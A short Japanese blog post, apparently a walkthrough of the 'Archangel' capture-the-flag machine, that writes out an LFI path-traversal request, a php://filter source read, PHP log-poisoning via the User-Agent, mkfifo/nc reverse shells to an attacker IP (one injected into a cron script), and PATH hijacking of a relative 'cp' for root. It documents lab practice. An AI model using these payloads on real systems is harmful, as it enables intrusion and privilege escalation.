---
title: "Archangel"
date: 2024-03-16T13:41:58+09:00
draft: false
---

### 1st flag

- metafive.thm
- /etc/host への追加

### 2nd flag

- robots.txt にある disallow にアクセスすると php ページに出る
- LFI
  - ```GET /test.php?view=/var/www/html/development_testing/..//..//..//..//etc/passwd```
  - エスケープに気を付ける必要がある
  - ```/home/archangel/user.txt ``` が露出していたので先に見る
  - PHP ラッパで test.php の中身も見ると 2nd flag がある
    - ```?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php```
  
### user.txt

- さっきのやつ

### user2.txt

- ログポイズニング
  - burp suite でパケットをキャッチ
  - ```”User-Agent: <?php system($_GET['cmd']); ?>”```
  - ```GET /test.php?view=/var/www/html/development_testing/..//..//..//..//var//log/apache2/access.log&cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|sh+-i+2>%261|nc+10.18.127.137+1234+>/tmp/f HTTP/1.1```
    - 空白は +, & は %26 にエスケープする
    - local で nc で待ち構えているとリバースシェルがもらえる
- archangel が user2.txt の権限をもっている
  - crontab
  - /opt/helloworld.sh が動いている
  - ```echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.18.127.137 4444 >/tmp/f” > /opt/hellowold.sh```

### root.txt

- archangel の home 内のファイルを見ると backup  というバイナリがある
  - strings で見るとワイルドカードの記述
    - ```cp /home/user/archangel/myfiles/* /opt/backupfile```
  - cp が絶対パスで書かれていないのでこれを書きかえる

```shell
archangel@ubuntu:~/secret$ $PATH
bash: /usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin: No such file or directory

archangel@ubuntu:/tmp$ export PATH=/tmp:$PATH
export PATH=/tmp:$PATH

archangel@ubuntu:/tmp$ $PATH
$PATH
bash: /tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin: No such file or directory
```

- 次に cp を作る

``` shell
archangel@ubuntu:/tmp$ echo "/bin/bash" > cp
echo "/bin/bash" > cp

archangel@ubuntu:/tmp$ cat cp
cat cp
/bin/bash
```

- chmod を忘れない
 